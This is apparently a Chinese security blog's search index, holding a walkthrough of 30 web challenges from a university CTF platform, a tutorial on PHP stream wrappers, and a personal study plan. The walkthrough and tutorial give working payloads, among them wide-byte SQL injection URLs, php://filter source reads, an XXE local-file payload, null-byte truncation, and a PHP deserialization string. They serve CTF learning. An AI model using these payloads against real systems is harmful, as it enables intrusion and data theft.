按键盘字母 i ， 在最后面加入一句： export PATH=/home/ubuntu/anaconda3/bin:$PATH 按键盘上 ESC ，再按 ：，输入 wq 退出vim $ source /home/ubuntu/.bashrc 如下]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[pwn思维导图]]></title>
      <url>%2F2017%2F01%2F13%2Fpwn%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%2F</url>
      <content type="text"><![CDATA[]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[南邮CTF平台web前30题解]]></title>
      <url>%2F2017%2F01%2F12%2F%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0web%E5%89%8D30%E9%A2%98%E8%A7%A3%2F</url>
      <content type="text"><![CDATA[1、查看源代码view-source:http://chinalover.sinaapp.com/web1/nctf{flag_admiaanaaaaaaaaaaa} 2、MD5碰撞http://115.28.150.176/md5/index.php?a=240610708nctf{md5_collision_is_easy} 3、绕过长度限制，firebug修改限制长度nctf{follow_me_to_exploit} 4、下载该gif文件，010编辑器打开， 最后nctf{photo_can_also_hid3_msg} 5、所谓层层递进，就是一层一层的慢慢找吧view-source:http://chinalover.sinaapp.com/web3/404.html nctf{this_is_a_fl4g} 6、 ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#39;_&#39;)[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [(ﾟｰﾟ) # (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) # (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;); 脑洞加密方式 http://www.tuicool.com/articles/2E3INnmfirebug 粘贴后 运行 nctf{javascript_aaencode} 7、看起来像是老题 burpsuit抓包 8、refer头部修改ncf{http_referer} 9、nctf{gzip_base64_hhhhhh} 10、filter方式读取源码http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php得到base64编码 并解码得到 11、burpsuit抓包， sendtorepeater 可以发现有重定向 一个个慢慢翻 nctf{this_is_302_redirect} 12、提示下载其他东西，查看源代码，发现下载连接为 download.php?url=[base64]已知的文件有 download.php 尝试下载 download.php -》 ZG93bmxvYWQucGhw 并查看所以继续下载 hereiskey.php -&gt; nctf{download_any_file_666} 13、页面提示 cookie burp抓包设置cookie为0 后发现右边出现 Login=0将cookie设置为 Login=1 nctf{cookie_is_different_from_session} 14、 访问http://chinalover.sinaapp.com/web11/robots.txt别太开心，flag不在这，这个文件的用途你看完了？在CTF比赛中，这个文件往往存放着提示信息TIP:sql.php &lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;)); if ($_GET[id]==1024) { echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; } else{ echo($query[content]); } } ?&gt; 所以目标是 http://chinalover.sinaapp.com/web11/sql.php 参数是 id 而且其中的那个数字 1024 很奇怪啊 intval是取整函数，所以让 id等于 1024.* 比如1024.9999999 1024.0000001 则$id = intval($_GET[id]) 后 $id=1024 http://chinalover.sinaapp.com/web11/sql.php?id=1024.1 nctf{query_in_mysql} 15、gbk 提示：宽字节注入先查 表名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,table_name from information_schema.tables%23 再查 字段名 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,column_name from information_schema.columns where table_name=0x666c6167%23 查询 数据 http://115.28.150.176/sqli/index.php?id=1%df&#39; union select 1,fl4g from flag %23 nctf{gbk_3sqli} 资料：宽字节注入https://www.91ri.org/8611.html 16、考点是 截断 然而…… * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf[0]=a &lt;-为什么这个方法可以？…… 运气 * teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu %00截断 %23为 # flag:nctf{use_00_to_jieduan} 17、注意和第二题的区别，第二题是== 而这一题是 === 要求不仅仅是值相同 而且类型要相同，所以这一题不能用md5碰撞在php中 md5() 需要一个string参数，但若传入一个数组类型，它不会报错但会返回空值利用这点，我们传入两个数组进行绕过if判断http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=0 Flag: nctf{php_is_so_cool} 18、变量覆盖！ &lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) { ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) { ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt; &lt;/div&gt; &lt;?php } ?&gt; &lt;?php } ?&gt; extract函数“可能”导致变量覆盖漏洞，我们传入pass的值，并且把thepassword_123的值覆盖为我们需要的值 nctf{bian_liang_fu_gai!} 19、查看index.txt &lt;?php if(eregi(“hackerDJ”,$_GET[id])) { echo(“not allowed!“); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;flag: *****************} &lt;/p&gt;&quot;; } ?&gt; &lt;br&gt;&lt;br&gt; Can you authenticate to this website? id 不能与 hackerDJ 相等，而且id经过 urldecode后要与 hackerDJ相同 http://php.net/manual/en/function.urldecode.php $_GET[]本身就有urldecode的功能 而且就 urlencode，是把对应的ASCII码前面加上%，urldecode就是把对应的编码还原，而未经编码的保持不变 所以对hackerDJ中的任意一个进行编码或是全部编码，效果相同 http://way.nuptzj.cn/php/index.php?id=%2568ackerDJ %2568ackerDJ在第一个GET处被urldecode成 %68ackerDJ ,绕过了第一个if判断， 接着是 代码中的显式urldecode，被还原成 hackerDJ 从而拿到 flag 20、本地登录，上burp 添加X-Forwarded-For:127.0.0.1 nctf{happy_http_headers} 21、都已经提示header了burp抓包，查看 nctf{tips_often_hide_here} 22、查看一下源代码，看一看upload.php然后我把那张gif.gif的图片传了上去，结果这里只写一下正确姿势，其余的上传绕过日后总结，在upload这里添上 1.php .gif (php和 . 之间是 空格键产生的空格)这里的 20 就是php和 . 之间的空格利用 00 截断上传 ，把 20 修改为 00nctf{welcome_to_hacks_world} 23、点进去是 Source 代码，没有看到显式的过滤或转义， trim（）是去除两侧空格所以尝试传入user为 admin’)# 其中 ‘）用来分别用来闭合 #用来把后面给注释掉这样最后的查询语句为 select user from ctf where (user=&#39;admin&#39;) nctf{ni_ye_hui_sql?} 24、注意提示： tip:strcmp(array,string)=null=0 所以根据代码逻辑，我们传入的pass若与pass1相等，则返回0， ！strcmp则为 真 这里是关于strcmp的解释http://www.w3school.com.cn/php/func_string_strcmp.asp 利用提示，我们传入 pass数组，比如 pass[]=1, 见右上。 nctf{strcmp_is_n0t_3afe} 25、传入十六进制，可以绕过判断， 54975581388http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc nctf{follow_your_dream} 26、既然是admin的密码，怎么会是ctfuser呢…… 上burpsuit 改一改，然而不对。 注意到地址栏，user1传了一个参数：ctfuser的加密结果 进去，这个也必须改掉 所以改为 user1=YWRtaW4= 后面那串是admin的base64加密。 GO nctf{reset_password_often_have_vuln} 27、在xman训练营时有接触过某题，我们以为它的考点是反序列化，但当时没有类（class），最后只好作罢：） &lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&#39;pass&#39;])) { $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; https://www.91ri.org/3960.htmlhttp://www.freebuf.com/vuls/80293.html然而有道坎实在绕不过去，那个$o-&gt;secret = “*”; 我不知道如何构造成相等……参考网上的一篇……http://115.159.210.46/archives/19.html &lt;?php class just4fun{ var $enter; var $secret; } $class =new just4fun(); $class-&gt;enter=&amp;$class-&gt;secret; print_r(serialize($class)) ?&gt;由上述代码得到最后的payload： http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}最后稍微总结一下知识点：1）反序列化漏洞，2）php在面对object传值时的“特性” nctf{serialize_and_unserialize} 28、好熟悉的感觉，看看源代码…… &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1){ die(&#39;Invalid password!&#39;); } echo $flag; --&gt;Invalid password! 好吧 xman夏令营时原题做过了SELECT FROM users WHERE name=’admin\’ AND pass=’ or 1 #’;这样一来 name=’*‘ or 1 条件恒真所以payload是 username=admin\&amp;password=%20or%201%23 nctf{sql_injection_is_interesting} 29、jsfuck……放到firebug里直接运行一下，出来一个新页面，其内容如下图http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在header里啊,上burpsuit查看，发现tip为 history of bash. 如下左图百度了一下， 如上右图，所以试着访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到新提示 zip -r flagbak.zip ./* 这是吧flagbak.zip文件解压到当前目录下， 所以flagbak.zip文件有可能仍然存在 尝试访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip解压，里面有flag.txt文件，打开，得到flag。 nctf{bash_history_means_what} 30、 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;; } else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); } } ntcf{union_select_is_wtf}]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浅谈php伪协议及在CTF比赛中的应用]]></title>
      <url>%2F2007%2F06%2F22%2F%E6%B5%85%E8%B0%88php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%9C%A8CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8%2F</url>
      <content type="text"><![CDATA[file://利用该协议可以访问本地文件系统，从而可能读取到敏感文件。 直接使用以wechall上的一题为例：1http://www.wechall.net/challenge/crappyshare/index.php?show=code 第215行开始，有如下代码：12345678910111213141516171819202122232425&lt;?php 省略function upload_please_by_url($url)&#123; if (1 === preg_match('#^[a-z]&#123;3,5&#125;://#', $url)) # Is URL? &#123; $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FAILONERROR, true); if (false === ($file_data = curl_exec($ch))) &#123; htmlDisplayError('cURL failed.'); &#125; else &#123; // Thanks upload_please_thx($file_data); &#125; &#125; else &#123; htmlDisplayError('Your URL looks errorneous.'); &#125;&#125;省略?&gt; curl_exec($ch)中的$ch可控，原本是希望能curl到远程服务器上的资源，但这里可以利用file：//读取到本地敏感文件。1http://www.wechall.net/challenge/crappyshare/crappyshare.php 结合其他方法比如XXE中，经常使用它来引入外部实体符号。比如以下payload：123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 更详细的内容可以见：小试XML实体注入攻击 php://http://cn2.php.net/manual/zh/wrappers.php.php 访问各个输入/输出流（I/O streams） php://filter读取文件这个经常在ctf比赛中用来读取源码，返回的是base64加密后的结果。假设index.php源码如下：1234&lt;?php @include($_GET["chybeta"]); show_source(__FILE__);?&gt; 利用php://filter读取index.php源码1http://XXX/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 有时候也可以直接用以下payload：1http://XXX/index.php?file==php://filter/resource=index.php php://input基本利用php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。 16年华山杯，源码如下：123456789101112&lt;?php$user = $_GET["user"];$file = $_GET["file"];$pass = $_GET["pass"];if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="the user is admin"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //class.php&#125;else&#123; echo "you are not admin ! ";&#125;?&gt; 可以利用php：//input。如下： 类似的题目，在jarvisoj的IN A mess可见到。 代码执行利用条件：allow_url_include = On。不过其实若allow_url_include = On 的话就可以直接远程文件包含了：）。测试代码同上。12url: http://localhost:20000/index.php?chybeta=php://inputpost: &lt;? phpinfo() ?&gt; 若没有开启allow_url_include，则会执行失败。 http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLs zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流 expect://用于处理交互式的流。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[先给自己定个小目标]]></title>
      <url>%2F2000%2F08%2F13%2F%E5%85%88%E7%BB%99%E8%87%AA%E5%B7%B1%E5%AE%9A%E4%B8%AA%E5%B0%8F%E7%9B%AE%E6%A0%87%2F</url>
      <content type="text"><![CDATA[啦啦啦，给自己定个小目标。 基本能力计算机基础 《CSAPP》 数据结构，算法 《挑战程序设计竞赛》 《算法导论》 gitshell编程Web安全研究员总体 基础能力： 语言能力: python,php,js,c++ 基本框架：java, php 基本漏洞/安全技术 成因/利用/解决方案：SQL注入、XSS、CSRF、LFI/RFI文件包含 渗透测试能力: 基本流程 工具使用：NMAP、SQLMAP、AWVS、APPSCAN、awvs、metasploit、burpsuite 渗透大型互联网企业经验 漏洞分析 规划8月13日 - 8月31日 主流web安全技术 《web安全深度剖析》 《代码审计》 ctf比赛比赛web总结 php-mvc开发 9月 挖掘网站漏洞 审计开源php框架 职位要求360 熟悉主流web安全技术，如:SQL注入、XSS、CSRF、LFI/RFI文件包含等 了解渗透测试的流程、方法，以及测试用例 熟悉web安全漏洞，精通渗透测试工具的使用（NMAP、SQLMAP、AWVS、APPSCAN） 至少掌握一种脚本语言，如：php/perl/python等，编写过相关自动化渗透工具者优先 阿里 熟悉WEB安全，熟悉各种WEB攻防技术以及安全漏洞原理，掌握多种安全行为的原理及其实现方法，有过独立分析或挖掘漏洞的经验； 熟悉常见验证码防控手段，熟悉JAVA/PHP等常见的WEB代码及开发流程，有渗透和逆向分析经验； 熟悉漏洞扫描、渗透测试工具、精通常见漏洞/木马的原理、危害、利用方式、检测、和修复方案； 精通js、PHP、python、java、C++等常用编程语言两门以上； 腾讯 熟悉应用层和系统层漏洞原理及其防御技术，包括web漏洞（SQL注入、XSS、代码执行、上传漏洞）、操作系统、第三方组件漏洞； 熟悉主流web安全漏洞扫描工具(awvs、metasploit、burpsuite等)； 了解国内外最新安全攻防技术； 能进行安全相关工具或脚本的开发； 具备安全项目管理与安全策略推进能力； 具备安全防护体系整体规划能力。 百度 具备基本的计算机技术基础（基本网络知识、基本编程能力） 有漏洞挖掘或代码安全审计经验 有渗透测试经验（熟悉各类典型漏洞的发现与利用） 具备基本的安全漏洞修复与攻击防御知识 追求卓越，不甘平庸，具备强烈的事业心和开拓创新精神 优秀的沟通能力以及团队合作精神 有大型互联网企业实习经验者优先 有专注于漏洞挖掘与利用技术研究者优先 有大型互联网渗透经验者优先 百度(安全实验室_资深安全研究员) 对安全体系、安全建设有全面掌握和理解，具备扎实安全基础和安全处置经验，既往工作中有较好的技术成果 精通风险评估、渗透测试（步骤、方法、流程、熟练掌握各种渗透测试工具）、安全加固、应急响应等工作，至少 3 年专业渗透测试经验 熟悉各类操作系统及数据库常见的安全漏洞和隐患, 各类中间件及平台系统，熟悉黑客攻防技术 精通主流编程语言至少一种，如C/C 、Python、Java等，能够独立编写漏洞利用程序 在t00ls、freebuf、Seebug、exploit-db.com等网站发布过漏洞 在业界有知名度或影响力则优先考虑 机器学习工程师总体 掌握主流机器学习算法，MapReduce 掌握 c++ / python 等语言 熟悉 常见的深度学习框架 在某个特定领域有较为深入的研究:自然语言处理、文本理解、分类、模式识别、推荐系统、定位系统、排名系统 参加数据挖掘比赛：kaggle，ImageNet等 在知名期刊上发表过论文 规划8月13日 - 8月31日 基本的机器学习算法 《统计学习方法》 《机器学习基石》 《集体智慧编程》 python coursera python基础教程 c++ c++ primer 9月1 日 - 9月17日+ 深入学习机器学习 + 《机器学习技法》 + 《the element of statical learning》 + c++ + c++ primer 职位要求腾讯 计算机、应用数学、模式识别、人工智能、自动化控制、统计学、运筹学、生物学、物理学/量子计算、神经科学等专业，本科及以上，博士优先； 熟悉常用机器学习算法，尤其是深度学习、增强学习等相关领域，对模式识别，概率统计、最优化等算法原理及应用，有扎实的基础，深入的理解和浓厚的兴趣； 精通C/C++、Java、Python等至少一门编程语言，有较强动手能力。了解目前常见的机器学习或者深度学习框架中的一个或者多个：Spark，XGBoost，Caffe，Tensorflow等…… 在计算机科学学术会议和期刊如NIPS、ICML、IJCAI、AAAI、UAI、KDD、SIGIR……等发表过论文，或者有相关的开源项目贡献经验； 乐于动手，有良好的逻辑思维能力和数据敏感度，能够熟练阅读和编写英文论文，具有优秀的新技术研究能力。 阿里 本科及以上学历，硕士博士优先，计算机、数学、电子工程、通信等相关专业； 熟悉常用机器学习算法，对模式识别、深度学习、增强学习等相关领域，极佳的工程实现能力，精通C/C++、Java、Python等至少一门编程语言 候选人有数理分析方面良好的素养以及数理统计基础 良好的数据敏感能力、较强的逻辑分析能力 好的团队合作精神，能够做到严谨、皮实、乐观 有实际成果并发表在国际顶级会议、期刊者优先，有在ImageNet、MSCOCO、ICDAR等权威数据库上提交过结果并取得优异成绩者优先 有deeplearning的经验，有linux下开发经验的，大规模数据处理经验优先 百度 热爱互联网，对技术研究和应用抱有浓厚的兴趣，有强烈的上进心和求知欲，善于学习和运用新知识 具有以下一个或多个领域的理论背景和实践经验：机器学习/数据挖掘/深度学习/信息检索/自然语言处理/机制设计/博弈论 至少精通一门编程语言，熟悉网络编程、多线程、分布式编程技术，对数据结构和算法设计有较为深刻的理解 良好的逻辑思维能力，对数据敏感，能够发现关键数据、抓住核心问题 较强的沟通能力和逻辑表达能力，具备良好的团队合作精神和主动沟通意识 熟悉文本分类、聚类、机器翻译，有相关项目经验 熟悉海量数据处理、最优化算法、分布式计算或高性能并行计算，有相关项目经验 微软亚洲研究院 计算机专业的本科以上学历 具备优秀的Python, JAVA，C/C++/C#编程能力，熟悉MapReduce 良好的沟通能力和团队协作能力 了解以下领域中的一个或几个：分布式计算，机器学习、数据挖掘 能保证至少六个月的实习；能得到导师的书面认可 微软 Truly Love software design and coding, is capable to research and to learn continuously; has strong interest and curiosity of technology Deep understanding of data architect and algorism design; is familiar with scripting, C++, C#, Java Experience or specialty in any of the following is preferred – data mining, machine learning, acoustic signal processing, image processing, natural language processing or deep learning Degree in Computer Science or related engineering, Master or PhD is preferred. Excellent analytical skills and problem solving skills, sensitive to data, candidate with experience of big data if preferred. Need to be willing to take challenges and initiatives, and innovative Is capable of continuous learning, communicating and collaborating with team members effectively 谷歌基本要求 计算机科学或相关技术专业文学/理学学士学位（或具备同等水平的实践经验）。 在机器学习或人工智能领域拥有 2 年工作或教育经验。 熟练使用一种或多种通用编程语言，包括但不限于：Java、C/C++ 或 Python。 在以下一个或多个领域拥有相关经验：自然语言处理、文本理解、分类、模式识别、推荐系统、定位系统、排名系统或类似领域。 优先条件 计算机科学、人工智能、机器学习或相关技术专业的硕士或博士学位。 拥有大规模机器学习方面的经验。接触过深度学习、神经网络或相关领域，并且对这些领域具有浓厚的兴趣，渴望从事相关工作。 拥有图形处理器 (GPU) 编程经验。 非常熟悉 ML 平台、解决方案和基础设施。 拥有分析复杂的动态模式的经验。了解算法的复杂性及优化算法的方法。 具备出色的沟通能力，能够与外部客户协同工作。 二进制漏洞总体 语言能力： c++,python,汇编 熟悉工具：olldbg，IDA,windbg，gdb 基本能力：漏洞缓解机制及绕过方法，应用层和内核逆向能力，熟悉文件格式（PE，Elf） 漏洞领域: 病毒木马研究，操作系统，浏览器，office，rootkit，bootkit，APT 平台：Windows、Linux、Android、iOS、Windows Phone 漏洞分析能力，漏洞利用代码编写能力 规划17.8.13 - 17.8.31 基本逆向能力： 《汇编语言》 《加密与解密》 基本漏洞攻击技术 栈溢出 格式化字符串漏洞 堆溢出 各种rop技术 linux下保护机制 17.9.1 - 17.9.17 深入学习IDA使用 《IDA权威教程》 ichunqiu 视频 漏洞分析 职位要求360（安全研究院-逆向分析工程师） 熟悉x86汇编、CC语言；熟悉PE，Elf文件格式； 熟练使用gdb, windbg, IDA 等逆向分析工具； 熟悉病毒、木马、恶意软件的工作原理，了解常用加解密算法； 熟悉操作系统原理，多年编程经验，常见二进制漏洞调试优先 腾讯(安全技术高级工程师) 熟练使用ida，ollydbg等逆向工具； 